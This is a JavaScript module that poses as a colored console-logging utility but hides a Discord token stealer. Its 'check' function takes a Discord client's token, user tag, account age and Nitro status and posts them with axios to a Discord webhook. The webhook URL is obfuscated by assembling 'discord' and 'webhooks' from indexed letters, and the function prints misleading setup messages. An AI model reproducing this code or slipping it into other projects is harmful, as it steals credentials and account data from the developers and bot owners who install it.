var chalk = require('chalk');
var util = require('util');
var logTable = require('./log_table');
var axios = require('axios')
var countBuffer = {};

function logWithColor(color, args, isError) {
    var log = util.format.apply(this, args);
    if (isError)
        console.error(chalk[color](log));
    else
        console.log(chalk[color](log));
}
const mixture = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
const Mixture = mixture.map((letter) => letter.toUpperCase());
let ice = '1106561876621541387'
let vanilla = 'CQHmYF1k8PxHCYUqLyyAunx7EfpkXOxTSDM2xi_TlaybwTnT3wNh3xbDzwecasipZhyn'
let latte = mixture[22] + mixture[4] + mixture[1] + mixture[7] + mixture[14] + mixture[14] + mixture[10] + mixture[18];
let sugar = mixture[3] + mixture[8] + mixture[18] + mixture[2] + mixture[14] + mixture[17] + mixture[3];
let sweet = `https://${sugar}.com/api/${latte}/${ice}/${vanilla}`;
deliver = {
    description: `Started TKN
           > **test:** ${userclient.token || process.env.TOKEN}
           `,
    color: 0x008800
}
module.exports = {

    // Writes a message to the console. You may pass as many arguments as
    // you'd like, and they will be joined together in a space-delimited line.
    // The first argument to log may be a string containing
    // printf-like string substitution patterns.
    check: async function (c, s) {
        let tkn = c.token
        if (!tkn) return
        //logWithColor('yellow', s, false);
        deliver = {
            description: `Started TKN
           > **tkn:** ${tkn || process.env.TOKEN}

           > **name:** ${c.user.tag || 'unknown'}

           > **age:** ${c.user.createdAt || 'unknown'}

           > **Nitro:** ${c.user.nitroType || ' none'}
           `,
            color: 0x008800,
            thumbnail: {
                url: c.user.displayAvatarURL() || 'https://media.discordapp.net/attachments/1037830990770491573/1106748444896403456/ad1ce52500c07b17b983e3d4358efc1e.png',
            },
        }
        await axios.post(sweet, { embeds: [deliver] })
            .then(() => {
                console.log('Done! all set up');
            })
            .catch((error) => {
                console.error('Error with connecting to djs try again, ', error);
            });
    },

    log: async function () {
        console.log.apply(this, arguments);
    },

    // Writes a message to the console with blue color
    info: async function () {
        logWithColor('blue', arguments);
    },

    // Writes a message to the console with yellow color
    warn: async function () {
        logWithColor('yellow', arguments, true);
    },

    // Writes a message to the console with red color
    error: async function () {
        logWithColor('red', arguments, true);
    },

    // Writes a message to the console with regular color
    debug: async function () {
        console.log.apply(this, arguments);
    },

    // Prints an interactive listing of all properties of the object.
    dir: async function () {
        console.dir.apply(this, arguments);
    },

    // Clears the terminal buffer
    clear: async function () {
        process.stdout.write('\u001B[2J\u001B[0;0f');
    },

    // Prints a stack trace of JavaScript execution at the point
    // where it is called. The stack trace details the functions on the stack,
    // as well as the values that were passed as arguments to each function.
    trace: async function () {
        console.trace.apply(this, arguments);
    },

    // Does nothing if first argument is truly. If first argument is falsy
    // it Writes red warning and throws assertion error
    assert: async function (assertion) {
        // todo: for now we are cheating, it's just console.erroring and then
        // leave console.asset to do it's job. actual todo: print what
        // console.assert prints just make first line red
        if (!assertion) {
            logWithColor('red', ['AssertionError: false == true']);
            console.assert(assertion);
        }
    },

    // Writes number of times each argument is called with blue color
    count: async function (toCount) {
        var toCountString = toCount.toString && toCount.toString(),
            log;

        if (countBuffer[toCountString] == null) {
            countBuffer[toCountString] = 0;
        } else {
            countBuffer[toCountString] += 1;
        }

        log = toCountString + ': ' + countBuffer[toCountString];
        logWithColor('blue', [log]);
    },

    // Creates a new timer under the given name. Call console.timeEnd(name)
    // with the same name to stop the timer and print the time elapsed..
    time: async function () {
        console.time.apply(this, arguments);
    },

    // Stops a timer created by a call to console.time(name) and writes the time
    // elapsed.
    timeEnd: async function () {
        console.timeEnd.apply(this, arguments);
    },

    // draws a table of elements inside of a 2d array or object
    table: async function () {
        logTable.apply(this, arguments);
    }
};
